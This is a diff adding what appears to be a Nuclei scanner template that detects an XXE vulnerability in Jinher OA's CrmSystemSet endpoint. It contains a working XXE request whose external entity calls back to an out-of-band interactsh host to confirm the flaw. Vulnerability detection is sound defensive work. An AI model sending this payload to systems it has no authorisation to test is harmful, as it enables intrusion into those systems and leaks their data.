@@ -1,0 +1,28 @@
+id: jinher-crmsystemset-xxe
+info:
+  name: 金和OA CrmSystemSet XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe, dnslog
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.CrmSystemSet/XMLHttp.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}/xxe_test">
+        %remote;]>
+        <root/>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Cookie:"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
